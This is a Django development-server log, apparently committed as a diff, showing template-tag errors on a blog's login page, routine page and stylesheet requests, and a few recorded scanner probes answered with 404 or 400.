+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 7: 'stati', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 21:48:04] "GET /auth/login HTTP/1.1" 500 148226
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 7: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 21:48:15] "GET /auth/login HTTP/1.1" 500 148241
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 7: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 21:48:48] "GET /auth/login HTTP/1.1" 500 148109
+[17/Jan/2021 21:49:19] "GET /auth/login HTTP/1.1" 200 2347
+[17/Jan/2021 21:49:19] "GET /static/css/blog_login.css HTTP/1.1" 200 72
+[17/Jan/2021 21:49:19] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:49:39] "GET /auth/login HTTP/1.1" 200 2339
+[17/Jan/2021 21:49:40] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:49:48] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:49:48] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:49:48] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:51:11] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:51:11] "GET /static/css/blog_login.css HTTP/1.1" 200 65
+[17/Jan/2021 21:51:11] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:51:19] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:51:19] "GET /static/css/blog_login.css HTTP/1.1" 200 66
+[17/Jan/2021 21:51:19] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:51:24] "GET /auth/signup HTTP/1.1" 200 2693
+[17/Jan/2021 21:51:34] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:51:35] "GET /static/css/blog_login.css HTTP/1.1" 200 41
+[17/Jan/2021 21:51:35] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:51:42] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:51:42] "GET /static/css/blog_login.css HTTP/1.1" 200 66
+[17/Jan/2021 21:51:42] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:52:10] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:52:10] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:52:10] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:52:49] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:52:49] "GET /static/css/blog_login.css HTTP/1.1" 200 74
+[17/Jan/2021 21:52:49] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:52:50] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:52:50] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:52:50] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:53:48] "GET /auth/login HTTP/1.1" 200 2347
+[17/Jan/2021 21:53:48] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:53:48] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:53:49] "GET /auth/login HTTP/1.1" 200 2347
+[17/Jan/2021 21:53:49] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:53:57] "GET /auth/login HTTP/1.1" 200 2347
+[17/Jan/2021 21:53:57] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:53:58] "GET / HTTP/1.1" 200 1769
+[17/Jan/2021 21:54:00] "GET /auth/login HTTP/1.1" 200 2347
+[17/Jan/2021 21:54:15] "GET /auth/login HTTP/1.1" 200 2347
+[17/Jan/2021 21:54:16] "GET /static/css/blog_login.css HTTP/1.1" 200 41
+[17/Jan/2021 21:54:16] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:54:42] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:54:42] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:54:42] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:55:33] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:55:33] "GET /static/css/blog_login.css HTTP/1.1" 200 289
+[17/Jan/2021 21:55:33] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:56:01] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:56:01] "GET /static/css/blog_login.css HTTP/1.1" 200 326
+[17/Jan/2021 21:56:01] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:56:03] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:56:03] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:56:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:56:25] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:56:26] "GET /static/css/blog_login.css HTTP/1.1" 200 258
+[17/Jan/2021 21:56:26] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:56:37] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:56:37] "GET /static/css/blog_login.css HTTP/1.1" 200 191
+[17/Jan/2021 21:56:37] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:56:46] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:56:46] "GET /static/css/blog_login.css HTTP/1.1" 200 220
+[17/Jan/2021 21:56:47] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:56:51] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:56:51] "GET /static/css/blog_login.css HTTP/1.1" 200 258
+[17/Jan/2021 21:56:51] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:57:00] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:57:00] "GET /static/css/blog_login.css HTTP/1.1" 200 258
+[17/Jan/2021 21:57:00] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:57:04] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:57:04] "GET /static/css/blog_login.css HTTP/1.1" 200 258
+[17/Jan/2021 21:57:04] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:57:14] "GET /auth/login HTTP/1.1" 200 2331
+[17/Jan/2021 21:57:14] "GET /static/css/blog_login.css HTTP/1.1" 200 317
+[17/Jan/2021 21:57:15] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:58:25] "GET /auth/login HTTP/1.1" 200 2429
+[17/Jan/2021 21:58:26] "GET /static/css/blog_login.css HTTP/1.1" 200 501
+[17/Jan/2021 21:58:26] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:58:42] "GET /auth/login HTTP/1.1" 200 2429
+[17/Jan/2021 21:58:42] "GET /static/css/blog_login.css HTTP/1.1" 200 1138
+[17/Jan/2021 21:58:42] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:58:47] "POST /auth/login HTTP/1.1" 200 2429
+[17/Jan/2021 21:58:47] "GET /admin/ HTTP/1.1" 302 0
+[17/Jan/2021 21:58:47] "POST /auth/login HTTP/1.1" 200 2429
+[17/Jan/2021 21:58:47] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:59:03] "POST /auth/login HTTP/1.1" 200 2429
+[17/Jan/2021 21:59:03] "GET /static/css/blog_login.css HTTP/1.1" 200 1231
+[17/Jan/2021 21:59:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 21:59:05] "POST /auth/login HTTP/1.1" 200 2429
+[17/Jan/2021 21:59:05] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:59:51] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 21:59:51] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 21:59:51] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:01:05] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:01:05] "GET /static/css/blog_login.css HTTP/1.1" 200 1275
+[17/Jan/2021 22:01:06] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:01:23] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:01:23] "GET /static/css/blog_login.css HTTP/1.1" 200 1306
+[17/Jan/2021 22:01:23] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:01:43] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:01:43] "GET /static/css/blog_login.css HTTP/1.1" 200 1338
+[17/Jan/2021 22:01:43] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:02:09] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:02:09] "GET /static/css/blog_login.css HTTP/1.1" 200 1339
+[17/Jan/2021 22:02:10] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:02:34] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:02:34] "GET /static/css/blog_login.css HTTP/1.1" 200 1339
+[17/Jan/2021 22:02:34] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:02:51] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:02:51] "GET /static/css/blog_login.css HTTP/1.1" 200 1339
+[17/Jan/2021 22:02:52] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:03:20] "POST /auth/login HTTP/1.1" 200 2449
+[17/Jan/2021 22:03:20] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:03:20] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:03:38] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:03:38] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:03:39] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:04:20] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:04:21] "GET /static/css/blog_login.css HTTP/1.1" 200 1437
+[17/Jan/2021 22:04:21] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:04:36] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:04:36] "GET /static/css/blog_login.css HTTP/1.1" 200 1439
+[17/Jan/2021 22:04:36] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:04:44] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:04:44] "GET /static/css/blog_login.css HTTP/1.1" 200 1439
+[17/Jan/2021 22:04:44] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:05:14] "POST /auth/login HTTP/1.1" 200 2463
+[17/Jan/2021 22:05:14] "GET /static/css/blog_login.css HTTP/1.1" 200 1443
+[17/Jan/2021 22:05:14] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:05:23] "POST /auth/login HTTP/1.1" 200 2477
+[17/Jan/2021 22:05:23] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:05:23] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:05:49] "POST /auth/login HTTP/1.1" 200 2477
+[17/Jan/2021 22:05:49] "GET /static/css/blog_login.css HTTP/1.1" 200 1481
+[17/Jan/2021 22:05:49] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:06:03] "POST /auth/login HTTP/1.1" 200 2477
+[17/Jan/2021 22:06:03] "GET /static/css/blog_login.css HTTP/1.1" 200 1482
+[17/Jan/2021 22:06:04] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:06:33] "POST /auth/login HTTP/1.1" 200 2477
+[17/Jan/2021 22:06:33] "GET /static/css/blog_login.css HTTP/1.1" 200 1590
+[17/Jan/2021 22:06:34] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:06:50] "POST /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:06:50] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:06:50] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:07:00] "POST /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:07:01] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:07:03] "POST /auth/login HTTP/1.1" 200 1736
+[17/Jan/2021 22:07:29] "GET /auth/logout HTTP/1.1" 302 0
+[17/Jan/2021 22:07:29] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:07:30] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:07:34] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:07:34] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:07:37] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:07:37] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:07:57] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:07:57] "GET /static/css/blog_login.css HTTP/1.1" 200 1590
+[17/Jan/2021 22:07:57] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:08:02] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:08:03] "GET /static/css/blog_login.css HTTP/1.1" 200 1590
+[17/Jan/2021 22:08:03] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:08:08] "POST /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:08:08] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:08:11] "GET /auth/signup HTTP/1.1" 200 2693
+[17/Jan/2021 22:08:13] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:08:18] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:08:18] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:09:06] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:09:07] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[17/Jan/2021 22:09:07] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:09:20] "GET /auth/login HTTP/1.1" 200 2469
+[17/Jan/2021 22:09:20] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:09:20] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:09:27] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:09:27] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:09:27] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:09:33] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:09:34] "GET /static/css/blog_login.css HTTP/1.1" 200 1612
+[17/Jan/2021 22:09:34] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:10:25] "GET /auth/signup HTTP/1.1" 200 2693
+[17/Jan/2021 22:13:05] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:13:05] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[17/Jan/2021 22:13:05] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[17/Jan/2021 22:13:05] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[17/Jan/2021 22:13:05] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[17/Jan/2021 22:14:25] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:14:52] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:14:52] "GET /static/css/blog_font.css HTTP/1.1" 200 869
+[17/Jan/2021 22:14:52] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[17/Jan/2021 22:14:52] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[17/Jan/2021 22:14:52] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[17/Jan/2021 22:26:39] "GET /auth/signup HTTP/1.1" 200 4152
+[17/Jan/2021 22:26:39] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:27:14] "GET /auth/signup HTTP/1.1" 200 4197
+[17/Jan/2021 22:27:15] "GET /static/images/favicon_blog.ico HTTP/1.1" 200 1150
+[17/Jan/2021 22:27:32] "GET /auth/signup HTTP/1.1" 200 0
+[17/Jan/2021 22:27:38] "GET /auth/signup HTTP/1.1" 200 4174
+[17/Jan/2021 22:27:39] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:27:40] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:27:44] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:27:45] "GET /auth/signup HTTP/1.1" 200 4174
+[17/Jan/2021 22:27:50] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:32:32] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:32:33] "GET /static/css/blog_login.css HTTP/1.1" 304 0
+[17/Jan/2021 22:32:34] "GET /auth/signup HTTP/1.1" 200 4174
+[17/Jan/2021 22:32:36] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:32:40] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:32:41] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:32:42] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:32:44] "GET /auth/login HTTP/1.1" 200 2473
+[17/Jan/2021 22:32:45] "GET /auth/signup HTTP/1.1" 200 4174
+[17/Jan/2021 22:32:47] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:45:04] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:46:05] code 400, message Bad request syntax ('º«d¡EZCÛM\x87î^ý¿\x159 XÔ>\x12\x98Ä<à\x13Ï\x00¬\xa09×\x90#8~\x8cÞ\x9dReF¿%1Qà\x9d\x06&g»\x82\x95\x19í\x07\x14\x19ZP\x80+\x94eÃæ\x85\x06¤\x99\x8b\x19l\x01ê\x88Y\x91\x16\x95ÄÈ\x0eH\x02Ç\x93gÁ4FW\x05|ûóT¸ýË»)ãÎÝÍ7\x9eïP\x8c¤[Vý\x98Él\x82õäÁd\x87X÷\x9b¿èq\x12\x99&Û,õ\x87×¨\x97j;ãê§´°\x02\xad\x8dE\x9bªB\x80\x0e)©é¯}\x18\x8e¸\x1e\x99\x04ï¨\x8cè\x04âÓí)1\x91Á\x8f\x88\x8c\x81ðÛ¥\x88\x95H\x9bZ«Î¿ôE%P*\x88KFY6\x9eç::jÔ\x8a¨V\x9aª«¯Ã&.í[\x04Åe\x7f\x08¾\x8ar§°\x99F÷\x11åÖ\x96\x8cIm+w\x1cýuU\x14\x0f!x¬èMPyÃ\x19!2\xa0íÀ}!Rw\x14\x8e\x1bÄá\xa0¯+\xadKkÅà\\s\x9c½Ë')
+[17/Jan/2021 22:46:05] "º«d¡EZCÛMî^ý¿9 XÔ>Ä<àÏ ¬ 9×#8~ÞReF¿%1Qà&g»íZP+eÃæ¤lêYÄÈHÇgÁ4FW|ûóT¸ýË»)ãÎÝÍ7ïP¤[VýÉlõäÁdX÷¿èq&Û,õ×¨j;ãê§´°­EªB)©é¯}¸ï¨èâÓí)1ÁðÛ¥HZ«Î¿ôE%P*KFY6ç::jÔ¨Vª«¯Ã&.í[Åe¾r§°F÷åÖIm+wýuU!x¬èMPyÃ!2 íÀ}!RwÄá ¯+­KkÅà\s½Ë" 400 -
+[17/Jan/2021 22:51:35] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:51:35] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:51:37] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:51:39] "GET / HTTP/1.1" 200 1753
+[17/Jan/2021 22:52:01] code 400, message Bad request version ('¸è¨Xñ\x0e\x03<\x95ºì/Ð³D4A')
+[17/Jan/2021 22:52:01] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /boaform/admin/formLogin
+[17/Jan/2021 23:18:31] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 2305
+Not Found: /wp-admin/install.php
+[17/Jan/2021 23:27:26] "GET /wp-admin/install.php?step=1 HTTP/1.1" 404 2278
+[17/Jan/2021 23:34:51] "GET / HTTP/1.0" 200 1753
+----------------------------------------
+Exception happened during processing of request from ('221.158.34.141', 6394)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
